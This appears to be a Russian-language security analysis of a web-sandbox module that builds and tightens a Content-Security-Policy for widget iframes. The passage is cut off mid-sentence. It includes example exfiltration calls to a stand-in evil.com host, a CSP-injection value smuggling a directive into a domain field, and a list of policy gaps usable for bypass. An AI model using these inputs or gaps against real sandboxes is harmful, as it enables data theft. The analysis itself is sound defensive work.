# `apply-csp-_9OvJz9C.js` — полный разбор

**Размер:** 5 121 байт
**URL:** `https://web-sandbox.oaiusercontent.com/assets/apply-csp-_9OvJz9C.js`
**Роль:** построение и применение Content-Security-Policy для iframe-виджета.
Защищает от ослабления политики и блокирует опасные источники.

---

# ЧАСТЬ 1. Контекст

## 1.1 Зачем вообще CSP в виджете

Виджет — это чужой код (сгенерированный моделью или пользователем), который
исполняется в iframe на origin `web-sandbox.oaiusercontent.com`.
Без CSP он мог бы:

- грузить скрипты с любого домена
- отправлять данные на чужой сервер (`fetch("https://evil.com", {...})`)
- встраивать чужие фреймы (кликджекинг)
- менять `base-uri`, чтобы подменить относительные пути

CSP ограничивает всё это на уровне браузера.

## 1.2 Где вызывается

В `run-user-code.js`:

```js
let p = false;
try {
  p = A(csp);          // A = N() из этого файла
} catch (t) {
  throw (e.error("Failed to apply CSP", t), t);
}
```

В `run-widget-code.js` — тоже, до записи HTML в iframe.

**Порядок важен:** CSP применяется **до** `document.write(html)`. Иначе
скрипты из HTML выполнились бы раньше, чем политика вступит в силу.

## 1.3 Что импортируется

```js
import {i as E} from "./main-BR1bOQyH.js";
```

`E` = `fi` — массив доверенных CDN:

```js
fi = [
  "https://cdn.jsdelivr.net",
  "https://cdn.tailwindcss.com",
  "https://esm.sh",
  "https://unpkg.com",
  "https://pypi.org",
  "https://files.pythonhosted.org"
]
```

---

# ЧАСТЬ 2. Постоянные списки

## 2.1 `P` — Azure Blob Storage для изображений

```js
P = [
  "oaisdmntpraueastdr.blob.core.windows.net",
  "oaisdmntpraustraliaeast.blob.core.windows.net",
  "oaisdmntprbrazilsouth.blob.core.windows.net",
  "oaisdmntprcacentral.blob.core.windows.net",
  "oaisdmntprcacentraldr.blob.core.windows.net",
  "oaisdmntprcentralindia.blob.core.windows.net",
  "oaisdmntprcentralindiadr.blob.core.windows.net",
  "oaisdmntprcentralus.blob.core.windows.net",
  "oaisdmntprcentralusdr.blob.core.windows.net",
  "oaisdmntpreastus.blob.core.windows.net",
  "oaisdmntpreastus2.blob.core.windows.net",
  "oaisdmntpreastus3.blob.core.windows.net",
  "oaisdmntprdenmarkeast.blob.core.windows.net",
  "oaisdmntprindiasocentral.blob.core.windows.net",
  "oaisdmntpritalynorth.blob.core.windows.net",
  "oaisdmntprjapaneast.blob.core.windows.net",
  "oaisdmntprjapaneastdr.blob.core.windows.net",
  "oaisdmntprkoreacentral.blob.core.windows.net",
  "oaisdmntprkoreacentraldr.blob.core.windows.net",
  "oaisdmntprnorthcentralus.blob.core.windows.net",
  "oaisdmntprnortheu.blob.core.windows.net",
  "oaisdmntprnortheurope.blob.core.windows.net",
  "oaisdmntprnznorth.blob.core.windows.net",
  "oaisdmntprpolandcentral.blob.core.windows.net",
  "oaisdmntprseasia.blob.core.windows.net",
  "oaisdmntprseasiadr.blob.core.windows.net",
  "oaisdmntprsouthcentralus.blob.core.windows.net",
  "oaisdmntprsoutheastus3.blob.core.windows.net",
  "oaisdmntpruaenorthdr.blob.core.windows.net",
  "oaisdmntpruksouthdr.blob.core.windows.net",
  "oaisdmntprukwest.blob.core.windows.net",
  "oaisdmntprwestcentralus.blob.core.windows.net",
  "oaisdmntprwestus.blob.core.windows.net",
  "oaisdmntprwestus2.blob.core.windows.net",
  "oaisdmntprwestus3.blob.core.windows.net"
]
```

**35 доменов.** Что это:

- `oaisdmntpr` = **OA**pen**AI** **SD** **M**?**N**?**T**?**PR**oduction
- `dr` в конце региона = **d**isaste**r** **r**ecovery (парный регион)
- `.blob.core.windows.net` — Azure Blob Storage

**Зачем:** изображения, сгенерированные DALL·E, хранятся в Azure Blob.
CSP должен их разрешить в `img-src`.

**Почему так много:** OpenAI раскидал хранилище по всем регионам Azure.
Виджет может получить картинку из любого — политика не должна угадывать
регион.

**Список захардкожен** — при добавлении нового региона его нужно дописать
вручную. Если этого не сделать, картинки из нового региона не загрузятся
(будут заблокированы CSP).

## 2.2 `_` — базовый список разрешённых

```js
_ = [
  ...E,                        // 6 CDN: jsdelivr, tailwind, esm.sh, unpkg, pypi, files.pythonhosted
  "*.oaiusercontent.com",      // wildcard на все поддомены
  ...P,                        // 35 Azure Blob
  "threejs.org"                // документация three.js
]
```

**Итого 43 элемента:**
- 6 CDN
- 1 wildcard `*.oaiusercontent.com`
- 35 Azure
- 1 `threejs.org`

**`*.oaiusercontent.com`** — wildcard покрывает `web-sandbox.oaiusercontent.com`,
`www-example-com.oaiusercontent.com` (домен-схема) и любые другие поддомены.

**`threejs.org`** — странный элемент. Зачем виджету грузить с threejs.org?
Скорее всего для примеров/моделей из документации three.js. Но в `script-src`
это открывает целый домен.

## 2.3 `R` — разрешённые протоколы

```js
R = new Set(["https:", "http:", "wss:"])
```

**Только три.** Отсутствуют:

- `ws:` — **нельзя** (только `wss:`). Незашифрованный WebSocket запрещён.
- `ftp:`, `file:`, `javascript:`, `data:` (как протокол URL) — нельзя.
- `blob:` — не в этом списке, но обрабатывается отдельно (см. 2.5).

## 2.4 `L` — regex «есть ли протокол»

```js
L = /^[a-z][a-z0-9+.-]*:\/\//i
```

**Что ловит:** `https://`, `http://`, `ftp://`, `custom://`, `blob:` — нет
(нужен `//`).

**Почему `+.-`:** по RFC 3986 схема может содержать `+`, `.`, `-`
(`coap+ws://`, `ms-appx.xyz://`).

**Флаг `i`** — без учёта регистра. `HTTPS://` тоже подойдёт.

**Тест:**
```
L.test("https://x.com")    → true
L.test("//x.com")          → false
L.test("x.com")            → false
L.test("blob:abc")         → false   (нет //)
L.test("javascript://x")   → true    (но отфильтруется на этапе протокола)
```

## 2.5 `C` — особые протоколы для доверенного режима

```js
C = new Set(["blob:", "data:"])
```

**Используются только при `isTrusted = true`** (см. 3.2).

`blob:` — нужен для Worker'ов (`worker-src blob:`) и для больших данных.
`data:` — для инлайн-картинок и шрифтов.

---

# ЧАСТЬ 3. Функции разбора

## 3.1 `d(e, n = false)` — нормализация доменов

```js
function d(e, n = false) {
  const o = new Set;

  for (let t of e) {
    let s = t.trim();
    if (!s) continue;                                   // 1. пустые пропустить

    if (n && C.has(s)) {                                // 2. blob:/data: при isTrusted
      o.add(s);
      continue;
    }

    L.test(s) || (s = `https://${s}`);                  // 3. без протокола → https://

    let r = null;
    try { r = new URL(s) } catch { if (!n) continue }    // 4. невалидный URL

    if (!n && (!r || !R.has(r.protocol))                // 5. протокол не разрешён
        || r?.username || r?.password) continue;        // 6. user:pass в URL

    const i = n ? t : r?.origin;                        // 7. при isTrusted — как дали
    !i || !/^[^\s;,"']+$/.test(i) || o.add(i);          // 8. валидация символов
  }

  return Array.from(o);
}
```

### Построчный разбор

**1. `const o = new Set`** — дедупликация. Порядок сохраняется (Set в JS
держит порядок вставки).

**2. `let s = t.trim(); if (!s) continue;`** — пустые и пробельные пропускаются.

**3. `if (n && C.has(s))`** — при `isTrusted = true` (`n = true`):
если строка ровно `"blob:"` или `"data:"` — добавить **как есть** и перейти
к следующему. **Без** разбора через `new URL`.

**Почему пропускать `new URL`:** `new URL("blob:")` вернёт `{protocol: "blob:", origin: "null"}`,
а нам нужна именно строка `blob:` в CSP, не `null`.

**4. `L.test(s) || (s = "https://" + s)`** — если протокола нет, добавить `https://`.
То есть `"example.com"` → `"https://example.com"`.

**5. `try { r = new URL(s) } catch { if (!n) continue }`** — если не парсится:
- при `isTrusted` — `r` останется `null`, пойдём дальше
- иначе — пропустить элемент

**6. `if (!n && (!r || !R.has(r.protocol)) || r?.username || r?.password) continue;`**

Разберём приоритет `&&`/`||`:

```js
(!n && (!r || !R.has(r.protocol))) || (r?.username) || (r?.password)
```

**Условия пропуска:**
1. `!n && !r` — не доверенный, URL не распарсился
2. `!n && !R.has(r.protocol)` — не доверенный протокол (`ws:`, `ftp:`)
3. `r.username` — в URL есть логин (`https://user@host`)
4. `r.password` — в URL есть пароль (`https://user:pass@host`)

**Почему запрещены username/password:** URL вида
`https://legit.com@evil.com/` в CSP-директиве может быть неверно
интерпретирован. Браузеры трактуют по-разному. Безопаснее отклонить.

**7. `const i = n ? t : r?.origin`**

- `isTrusted` → берётся **исходная строка** `t` (не trimmed, не нормализованная)
- иначе → **`origin`** из URL: схема + хост + порт, без пути

**Почему `origin`, а не `hostname`:** `https://example.com:8443/path` →
`https://example.com:8443`. Порт важен.

**Почему при `isTrusted` — `t`:** доверенный режим не нормализует. Хост сам
отвечает за формат.

**8. `!i || !/^[^\s;,"']+$/.test(i) || o.add(i)`**

Comma-оператор-обход антипаттерна. Разберём:

```js
if (!i) → не добавлять
else if (!/^[^\s;,"']+$/.test(i)) → не добавлять
else o.add(i)
```

**Regex `/^[^\s;,"']+$/`** — «один или более символов, кроме пробельных,
`;`, `,`, `"`, `'`».

**Зачем:** CSP-директива разделена пробелами, `;` разделяет директивы.
Если домен содержит пробел или `;` — это **инъекция CSP**:

```
resourceDomains: ["evil.com; script-src *"]
```
→ `script-src 'self' https://evil.com; script-src *` — политика сломана.

Запятая и кавычки тоже опасны (в `style-src-attr` и т.п.).

**Результат `d()`:** массив уникальных origin.

### Пример работы

```js
d(["example.com", "https://api.test.com/path", "ws://x.com", "data:x"])
```

| Вход | Обработка | Результат |
|---|---|---|
| `"example.com"` | + `https://` → URL → origin | `https://example.com` |
| `"https://api.test.com/path"` | уже протокол → origin | `https://api.test.com` |
| `"ws://x.com"` | протокол `ws:` не в `R` | пропущен |
| `"data:x"` | нет `//` → `https://data:x` → `new URL` → origin `https://data` | `https://data` |

**Внимание на последний:** `"data:x"` не распознаётся как `data:`-URL,
потому что в `C` проверка `C.has(s)` — точное совпадение `"data:"`.
`"data:x"` ≠ `"data:"`. Значит пойдёт в `https://data:x` → origin `https://data`.

**Это баг?** Не совсем — `data:x` как домен бессмыслен. Но показывает, что
`C.has` проверяет **точную строку**, а не префикс.

## 3.2 `S(e)` — превратить массив в CSP-строку

```js
const S = e => e.filter(Boolean)
                 .map(n => L.test(n) || C.has(n) ? n : `https://${n}`)
                 .join(" ");
```

**Пошагово:**
1. `filter(Boolean)` — убрать `null`, `undefined`, `""`, `0`
2. Для каждого: если есть протокол (`https://x`) **или** это `blob:`/`data:` —
   оставить как есть; иначе добавить `https://`
3. Склеить через пробел

**Пример:**
```js
S(["https://cdn.jsdelivr.net", "*.oaiusercontent.com", "blob:", null, ""])
→ "https://cdn.jsdelivr.net *.oaiusercontent.com blob:"
```

**`C.has(n)` здесь** — для случая, когда после `d()` остался `blob:`/`data:`
(только при `isTrusted`).

**`"*.oaiusercontent.com"`** — не проходит `L.test` (нет `://`), не в `C` →
стало бы `https://*.oaiusercontent.com`. Но в `q()` wildcard уже с `https://`
из `_`, так что это не срабатывает. Однако если кто-то передаст wildcard
в `resourceDomains`, получится `https://*.example.com` — валидно.

---

# ЧАСТЬ 4. Генерация политики — `q()`

## 4.1 Полный код

```js
function q({
  disableNetworkRequests: e = false,
  resourceDomains: n,
  imageDomains: o = [],
  frameDomains: t = [],
  connectDomains: s = [],
  baseUriDomains: r = [],
  isTrusted: i
}) {
  const l = e ? [] : _,                              // базовые домены
        a = e ? "" : S(l.concat([], d(n, i))),       // resource
        f = e ? "" : d(o).join(" "),                 // image
        h = e ? "" : S(l.concat(d(s, i))),           // connect
        b = e ? "" : S(d(t, i)),                     // frame
        p = S(d(r, i)),                              // base-uri (ВСЕГДА)
        u = e ? "" : "'self'",                       // default-src
        D = e ? `${window.location.origin}/assets/` : "'self'",   // script/style
        c = (O, A) => `${O} ${A.trim() || "'none'"}`; // helper

  return `<meta http-equiv="Content-Security-Policy" content="${[
    c("default-src", u),
    c("script-src", `${D} 'wasm-unsafe-eval' 'unsafe-inline' 'unsafe-eval' blob: ${a}`),
    c("worker-src", "blob:"),
    c("style-src", `${D} 'unsafe-inline' ${a}`),
    c("style-src-elem", `${D} 'unsafe-inline' ${a}`),
    "style-src-attr 'unsafe-inline'",
    c("img-src", `${u} data: ${a} ${f}`),
    c("font-src", `${u} ${a}`),
    c("connect-src", `${u} ${h}`),
    c("media-src", `${u} ${a}`),
    "object-src 'none'",
    c("frame-src", b.length > 0 ? b : "'none'"),
    c("base-uri", p.length > 0 ? p : "'self'"),
    "upgrade-insecure-requests"
  ].filter(Boolean).join("; ")}">`;
}
```

## 4.2 Вычисление переменных

### `l` — базовые домены

```js
const l = e ? [] : _
```
- `disableNetworkRequests: true` → `[]`
- иначе → `_` (43 элемента)

### `a` — resource/script/style/worker

```js
a = e ? "" : S(l.concat([], d(n, i)))
```
- `l` (43 базовых) + `d(resourceDomains)` (пользовательские)
- `[].concat` — просто копия `l`
- при `isTrusted` пользовательские домены **не нормализуются**

**Куда идёт `a`:**
- `script-src`
- `style-src`
- `style-src-elem`
- `img-src`
- `font-src`
- `media-src`

**Один список на всё.** То есть если виджет разрешил `cdn.jsdelivr.net`
для скриптов — он же разрешён для картинок, шрифтов, медиа.

### `f` — image-only домены

```js
f = e ? "" : d(o).join(" ")
```
**Без `isTrusted`!** `d(o)` вызывается без второго аргумента → `n = false`.

**То есть `imageDomains` всегда нормализуются**, даже в доверенном режиме.
Асимметрия с `resourceDomains` и `connectDomains`.

### `h` — connect

```js
h = e ? "" : S(l.concat(d(s, i)))
```
- базовые + пользовательские connect-домены
- при `isTrusted` — не нормализуются

### `b` — frame

```js
b = e ? "" : S(d(t, i))
```
**Только пользовательские**, без базовых. Если `frameDomains` пуст → `b = ""`
→ в директиве будет `frame-src 'none'`.

### `p` — base-uri

```js
p = S(d(r, i))
```
**Обрати внимание: `p` вычисляется БЕЗ проверки `e`.**

То есть даже при `disableNetworkRequests: true` base-uri разрешает
пользовательские домены.

**Почему:** `base-uri` не про сеть, а про `<base href>`. Он меняет, куда
разрешаются относительные URL. Это не сетевой запрос сам по себе.

### `u` — default-src

```js
u = e ? "" : "'self'"
```
- запрет сети → пустая строка → `c()` подставит `'none'`
- иначе → `'self'`

**Результат:** `default-src 'none'` при `disableNetworkRequests: true`.

### `D` — источник для script/style

```js
D = e ? `${window.location.origin}/assets/` : "'self'"
```

**Вот это интересно.**

- **Обычный режим:** `'self'` — скрипты только с того же origin
- **`disableNetworkRequests: true`:** `https://web-sandbox.oaiusercontent.com/assets/` —
  конкретный путь

**Почему ужесточение при запрете сети:** `'self'` разрешает **весь** origin,
включая `/api/`, `/session/` и любые другие пути. `/assets/` — только
бандлы Skybridge.

**То есть `disableNetworkRequests` делает политику строже двумя способами:**
1. `default-src 'none'` вместо `'self'`
2. `script-src https://origin/assets/` вместо `'self'`

### `c(O, A)` — helper директивы

```js
c = (O, A) => `${O} ${A.trim() || "'none'"}`
```
Пустое значение → `'none'`. Например `default-src 'none'`.

---

# ЧАСТЬ 5. Итоговая политика

## 5.1 Обычный режим (`disableNetworkRequests: false`)

```
default-src 'self';
script-src 'self' 'wasm-unsafe-eval' 'unsafe-inline' 'unsafe-eval' blob:
            https://cdn.jsdelivr.net https://cdn.tailwindcss.com https://esm.sh
            https://unpkg.com https://pypi.org https://files.pythonhosted.org
            https://*.oaiusercontent.com
            <35 Azure Blob>
            https://threejs.org
            <resourceDomains>;
worker-src blob:;
style-src 'self' 'unsafe-inline' <те же>;
style-src-elem 'self' 'unsafe-inline' <те же>;
style-src-attr 'unsafe-inline';
img-src 'self' data: <те же> <imageDomains>;
font-src 'self' <те же>;
connect-src 'self' <те же> <connectDomains>;
media-src 'self' <те же>;
object-src 'none';
frame-src <frameDomains | 'none'>;
base-uri <baseUriDomains | 'self'>;
upgrade-insecure-requests
```

## 5.2 Строгий режим (`disableNetworkRequests: true`)

```
default-src 'none';
script-src https://web-sandbox.oaiusercontent.com/assets/
            'wasm-unsafe-eval' 'unsafe-inline' 'unsafe-eval' blob: ;
worker-src blob:;
style-src https://web-sandbox.oaiusercontent.com/assets/ 'unsafe-inline' ;
style-src-elem https://web-sandbox.oaiusercontent.com/assets/ 'unsafe-inline' ;
style-src-attr 'unsafe-inline';
img-src 'none' data:  ;
font-src 'none' ;
connect-src 'none' ;
media-src 'none' ;
object-src 'none';
frame-src 'none';
base-uri <baseUriDomains | 'self'>;
upgrade-insecure-requests
```

**Обрати внимание на `img-src 'none' data:  ;`** — два пробела. Потому что
`${a}` пустой. Косметика, браузер съест.

**`img-src 'none' data:`** — противоречиво: `'none'` запрещает всё, `data:`
разрешает data-URL. В CSP `'none'` должен быть единственным источником;
если есть другие, `'none'` браузеры игнорируют. Значит работает `data:`.

**То есть в строгом режиме `img-src data:` фактически разрешает data-картинки.**

## 5.3 Что НЕ ограничено

| Директива | Присутствует? |
|---|---|
| `form-action` | ❌ нет |
| `frame-ancestors` | ❌ нет |
| `navigate-to` | ❌ нет (устарела) |
| `sandbox` | ❌ нет |
| `report-uri` | ❌ нет |
| `trusted-types` | ❌ нет |
| `require-trusted-types-for` | ❌ нет |

**Отсутствие `form-action`:** виджет может отправить `<form action="https://evil.com">`
и POST-запрос пройдёт (при наличии user gesture). Впрочем, `connect-src`
на fetch/XHR ограничивает, но не на form-submit.

**Отсутствие `frame-ancestors`:** iframe защищён атрибутом `sandbox`, но не
`frame-ancestors`. Впрочем, `<meta>`-тег `frame-ancestors` не работает —
только HTTP-заголовок. Так что это не упущение.

**Отсутствие `trusted-types`:** значит `innerHTML` не ограничен. Виджет может
вставлять HTML-строки без санитизации — потенциальный DOM-XSS внутри
своего же origin.

---

# ЧАСТЬ 6. Сравнение политик — `M()` и `w()`

## 6.1 `g(e)` — нормализовать для сравнения

```js
function g(e) {
  if (!e?.length) return [];                                    // пусто → []
  if (e.some(o => o.trim().toLowerCase() === "'none'")) return []; // 'none' → []
  if (e.some(o => o.trim() === "*")) return ["*"];              // "*" → ["*"]
  const n = new Set;
  for (const o of e) {
    const t = o.trim().toLowerCase();
    t && n.add(t);
  }
  return Array.from(n.values());
}
```

**Правила:**
1. Пустой/отсутствующий → `[]`
2. Есть `'none'` → `[]`  (потому что `'none'` = «ничего»)
3. Есть `*` → `["*"]`    (wildcard поглощает всё)
4. Иначе — lowercase, trim, дедупликация

**Зачем lowercase:** домены регистронезависимы. `CDN.JSDelivr.net` = `cdn.jsdelivr.net`.

**Зачем `'none'` → `[]`:** в CSP `'none'` и пустой список эквивалентны
(«ничего не разрешено»). Но синтаксически `'none'` с другими источниками
невалиден.

## 6.2 `w(a, b)` — сравнить два списка

```js
function w(e, n) {
  const o = g(e),          // база
        t = g(n),          // новая
        s = o.includes("*"),
        r = t.includes("*");

  if (s && !r) return "more";    // база *, новая без * → новая строже
  if (!s && r) return "less";    // база без *, новая * → новая слабее
  if (s && r) return "equal";    // оба * → равны

  const i = new Set(o), l = new Set(t);

  const a = (b, p) => { for (const u of b) if (!p.has(u)) return false; return true };

  const f = a(l, i),   // все элементы t есть в o?  (новая ⊆ база)
        h = a(i, l);   // все элементы o есть в t?  (база ⊆ новая)

  return f && h ? "equal"      // совпадают
       : f && l.size < i.size ? "more"   // новая — подмножество меньшего размера
       : "less";                          // иначе
}
```

**Семантика `"more"` = строже** (меньше разрешено), **`"less"` = слабее**.

**Разбор:**

| `f` (новая ⊆ база) | `h` (база ⊆ новая) | Результат |
|---|---|---|
| true | true | `"equal"` — совпадают |
| true | false | новая — подмножество → `"more"` (строже) |
| false | true | новая — надмножество → `"less"` (слабее) |
| false | false | **несравнимы** → `"less"` |

**Последний случай интересен:** если списки пересекаются, но не вложены
(`["a","b"]` vs `["b","c"]`) — вернётся `"less"` (слабее).

**Почему `"less", а не "unknown"`:** консервативно. Неизвестная политика
считается ослаблением → `N()` бросит ошибку.

**Проверка `f && l.size < i.size`:** `f` уже гарантирует подмножество.
Если размеры равны и подмножество — они равны, но это уже покрыто `h`.
Здесь: `f=true, h=false` → новая строго меньше.

**Упрощение:** `f && !h` эквивалентно `f && l.size < i.size` при корректных
множествах. Код избыточен.

## 6.3 `y(e)` — base-uri по умолчанию

```js
function y(e) {
  return e?.length ? e : ["'self'"];
}
```
Если base-uri не задан → `['self']`. Это дефолт из `q()`.

## 6.4 `z(a, b)` — сравнить булевы флаги

```js
function z(e, n) {
  const o = !!e, t = !!n;
  return o === t ? "equal" : t ? "more" : "less";
}
```
- `true` → `true` = equal
- `false` → `true` = **more** (включили запрет = строже)
- `true` → `false` = **less** (выключили запрет = слабее)

## 6.5 `M(e, n)` — сравнить две политики

```js
function M(e, n) {
  if (!e) return "more";              // текущей нет → любая = строже

  let o = false;                      // "был ли хоть один more"

  const t = z(e.disableNetworkRequests, n.disableNetworkRequests);
  if (t === "less") return "less";    // ослабление → сразу less
  t === "more" && (o = true);

  const s = w(e.resourceDomains, n.resourceDomains);
  if (s === "less") return "less";
  s === "more" && (o = true);

  const r = w(d(e.imageDomains ?? []), d(n.imageDomains ?? []));
  if (r === "less") return "less";
  r === "more" && (o = true);

  const i = w(e.connectDomains, n.connectDomains);
  if (i === "less") return "less";
  i === "more" && (o = true);

  const l = w(e.frameDomains, n.frameDomains);
  if (l === "less") return "less";
  l === "more" && (o = true);

  const a = w(y(e.baseUriDomains), y(n.baseUriDomains));
  return a === "less" ? "less" : (a === "more" && (o = true), o ? "more" : "equal");
}
```

**Логика:**

1. **Если текущей политики нет** (`$ === null`) → `"more"` — любая новая
   строже, чем «никакой политики»
2. Каждое поле сравнивается; **любое ослабление → сразу `"less"`** (fail fast)
3. Если хоть одно поле стало строже → `"more"`
4. Иначе → `"equal"`

**Что НЕ сравнивается:**

| Поле | Сравнивается? |
|---|---|
| `disableNetworkRequests` | ✅ |
| `resourceDomains` | ✅ |
| `imageDomains` | ✅ (через `d()`) |
| `connectDomains` | ✅ |
| `frameDomains` | ✅ |
| `baseUriDomains` | ✅ |
| `isTrusted` | ❌ **нет** |

**`isTrusted` не сравнивается!** То есть можно:

```js
// Первый вызов
N({disableNetworkRequests: true, isTrusted: false})
// Второй вызов — не ослабление по M(), но isTrusted=true меняет политику
N({disableNetworkRequests: true, isTrusted: true})
```

**Что даёт `isTrusted: true`:** `d(n, i)` с `i = true` — домены **не
нормализуются**. Значит можно передать:

```js
resourceDomains: ["blob:", "data:"]
```

Что даст `script-src ... blob: data:` — **выполнение произвольного кода
из data-URL**.

**Но:** `blob:` уже есть в `script-src` базово (`'unsafe-eval' blob:`).
А `data:` в `script-src` — новое.

**Плюс:** при `isTrusted` домены не проходят проверку на `;` и пробелы!
Значит:

```js
resourceDomains: ["evil.com; script-src *"]
```

→ `d()` вернёт `"evil.com; script-src *"` (без нормализации, потому что
`i = t`) → `S()` → `"evil.com; script-src *"` → **политика сломана**.

**Проверка `/^[^\s;,"']+$/` в `d()` всё равно срабатывает** (шаг 8), потому
что она не зависит от `n`:

```js
!i || !/^[^\s;,"']+$/.test(i) || o.add(i)
```

Пробел и `;` не пройдут. **Значит инъекция CSP через `isTrusted` не работает.**

Но остаётся: `data:`/`blob:` проходят, потому что не содержат запрещённых
символов.

## 6.6 Примеры `M()`

**Случай 1 — ослабление:**
```js
M({resourceDomains: ["a.com"]}, {resourceDomains: ["a.com", "b.com"]})
→ ресурсы: w(["a.com"], ["a.com","b.com"]) → "less"
→ вернёт "less" → N() бросит "CSP is being loosened"
```

**Случай 2 — ужесточение:**
```js
M({resourceDomains: ["a.com","b.com"]}, {resourceDomains: ["a.com"]})
→ w → "more" → o = true
→ прочие поля equal
→ вернёт "more"
```

**Случай 3 — включение запрета сети:**
```js
M({disableNetworkRequests: false}, {disableNetworkRequests: true})
→ z(false, true) → "more" → o = true
→ вернёт "more"
```

**Случай 4 — выключение запрета:**
```js
M({disableNetworkRequests: true}, {disableNetworkRequests: false})
→ z(true, false) → "less"
→ вернёт "less" → throw
```

**Случай 5 — несравнимые списки:**
```js
M({resourceDomains: ["a.com","b.com"]}, {resourceDomains: ["b.com","c.com"]})
→ w: f=a(l,i) = все ли из новой в базе? ["b","c"] ⊆ ["a","b"]? → false
     h=a(i,l) = все ли из базы в новой? ["a","b"] ⊆ ["b","c"]? → false
→ f&&h=false, f=false → "less"
→ вернёт "less" → throw
```

**То есть нельзя заменить один домен на другой** — только добавлять или
убирать. Нельзя `["a"] → ["b"]`, даже если оба безопасны.

---

# ЧАСТЬ 7. Применение — `N()`

## 7.1 Полный код

```js
let $ = null;    // текущая политика (объект)
let m = null;    // текущий <meta> элемент

function N(e) {
  if (!e) return false;                    // 1

  const n = M($, e);                       // 2
  if (n === "less") throw new Error("CSP is being loosened");  // 3
  if (n === "equal") return false;         // 4

  const o = q(e),                          // 5 — построить <meta>-строку
        t = j(o);                          // 6 — распарсить в элемент

  if (m?.isConnected) m.replaceWith(t);    // 7a — заменить в DOM
  else {
    const s = document.head.querySelector('meta[http-equiv="Content-Security-Policy"]');
    s ? s.replaceWith(t) : document.head.appendChild(t);   // 7b
  }

  return m = t, $ = e, true;               // 8
}

export {N as a};
```

## 7.2 Пошагово

**1. `if (!e) return false`** — нет конфига → ничего не делать.

**2. `const n = M($, e)`** — сравнить с текущей.

**3. `n === "less"` → throw.** Ослабление запрещено. Сообщение:
`"CSP is being loosened"`.

**4. `n === "equal"` → return false.** Ничего не изменилось — не трогать DOM.

**5. `q(e)`** — построить строку `<meta ...>`.

**6. `j(o)`** — превратить строку в DOM-элемент:

```js
function j(e) {
  if (typeof e != "string") return e;
  const n = document.createElement("div");
  n.innerHTML = e.trim();
  const o = n.querySelector('meta[http-equiv="Content-Security-Policy"]');
  if (!o) throw new Error("buildMetaTag() did not produce a CSP <meta> tag");
  return o;
}
```

**Разбор `j()`:**

- `createElement("div")` + `innerHTML = e` — парсинг HTML-строки в DOM
- `querySelector('meta[http-equiv="Content-Security-Policy"]')` — найти тег
- **Если тег не нашёлся — throw.** Это защита от бага в `q()`.

**Почему не `createElement("meta")` напрямую:** `q()` возвращает строку,
удобнее распарсить.

**Проблема:** `innerHTML` на `<meta>` — работает, но:
- `<meta>` в `<div>` — валидно в HTML-парсере (мета-теги допускаются в body
  для парсинга)
- **но** при `document.head.appendChild` политика применяется только
  для **последующих** запросов. Уже загруженные ресурсы не перепроверяются.

**7. Замена в DOM:**

```js
if (m?.isConnected) m.replaceWith(t);
else {
  const s = document.head.querySelector('meta[http-equiv="Content-Security-Policy"]');
  s ? s.replaceWith(t) : document.head.appendChild(t);
}
```

- Если наш `m` ещё в DOM → заменить его
- Иначе — найти любой такой `<meta>` в `<head>` и заменить
- Если нет — добавить

**Зачем `m?.isConnected`:** если iframe пересоздали (новый `document`),
`m` указывает на элемент из старого документа. `isConnected === false` →
искать в новом.

**8. `return m = t, $ = e, true`** — сохранить состояние, вернуть `true`
(политика изменилась).

## 7.3 Глобальное состояние

```js
let $ = null;    // текущая политика
let m = null;    // текущий <meta>
```

**Эти переменные — на уровне модуля.** То есть **один экземпляр на весь
бандл**. Если два виджета в разных iframe вызывают `N()` — они делят
состояние.

**Проблема:** `run-widget-code` создаёт новый iframe для каждого виджета.
Но модуль загружен **в главном документе** (`web-sandbox.oaiusercontent.com`),
и `$`/`m` общие.

**Последствие:** если виджет A применил строгую политику, а виджет B —
попытается более слабую, `N()` бросит `"CSP is being loosened"`, хотя это
**другой** iframe.

**Если iframe создан через `srcdoc`/`document.write`** — у него свой
`document`, но модуль выполняется в контексте iframe? Нет: `run-widget-code`
импортируется в главном документе, `apply-csp` тоже. Политика применяется
к `<head>` **главного** документа? Нет — `document.head` внутри iframe
недоступен из главного.

**Разберём точнее:** где выполняется `apply-csp`?

В `runUserCode` → `A(csp)` — вызывается в контексте **главного**
`web-sandbox.oaiusercontent.com`. `document.head` — главный документ.

**Но у главного документа свой CSP** (из HTTP-заголовка). Мета-тег добавит
**дополнительные** ограничения (CSP объединяются как пересечение).

**То есть:** `N()` ужесточает политику **для главного документа**, а не для
iframe. А iframe получает политику через... что?

Проверим `run-widget-code`: там `prepareWidgetDocument` пишет HTML в iframe.
CSP для iframe — из `srcdoc`-мета-тега внутри HTML? Или наследуется?

**Ответ:** `iframe` без `src` (через `document.write`) **наследует** CSP
родителя. Плюс может иметь свой `<meta>`.

**Значит:** `N()` делает **глобальное** ужесточение — для всех последующих
iframe. И `$`/`m` — глобальное состояние. Что объясняет «только ужесточение»:
нельзя ослабить, потому что это повлияет на уже запущенные виджеты.

---

# ЧАСТЬ 8. Что реально защищено и что нет

## 8.1 Защита работает

| Атака | Блокируется? | Чем |
|---|---|---|
| Загрузить скрипт с evil.com | ✅ | `script-src` |
| `fetch("https://evil.com")` | ✅ | `connect-src` |
| `new WebSocket("ws://evil.com")` | ✅ | `connect-src` (нет `ws:`) |
| `<iframe src="https://evil.com">` | ✅ | `frame-src` |
| `<base href="https://evil.com">` | ✅ | `base-uri` |
| Встроить `<object>`/`<embed>` | ✅ | `object-src 'none'` |
| Загрузить шрифт с evil.com | ✅ | `font-src` |
| Ослабить политику повторным вызовом | ✅ | `M()` → `"less"` → throw |
| Инъекция через `;` в домене | ✅ | regex `/^[^\s;,"']+$/` |
| iPhone/Android-специфичный биндинг | — | не в этом файле |

## 8.2 Защита НЕ работает

| Атака | Почему |
|---|---|
| `<form action="https://evil.com">` | нет `form-action` |
| DOM-XSS через `innerHTML` | нет `trusted-types` |
| Отправка данных через `img.src` | `img-src` включает `data:` и 43 домена |
| Утечка через DNS (prefetch) | нет `prefetch-src`, нет `dns-prefetch-control` |
| Чтение через `window.name` | не покрывается CSP |

## 8.3 Главные слабости политики

### 1. `'unsafe-inline'` + `'unsafe-eval'` в `script-src`

```
script-src 'self' 'wasm-unsafe-eval' 'unsafe-inline' 'unsafe-eval' blob: ...
```

- `'unsafe-inline'` — любой `<script>` внутри HTML выполнится
- `'unsafe-eval'` — `eval()`, `Function()`, `setTimeout("code")` работают
- `blob:` — Worker из blob-URL

**Вместе:** виджет может выполнить **любой** JS, который попал в его HTML.
CSP здесь защищает только от **загрузки внешних** скриптов, но не от
инлайн-кода.

**Почему так:** виджет — это и есть пользовательский код. Без `'unsafe-inline'`
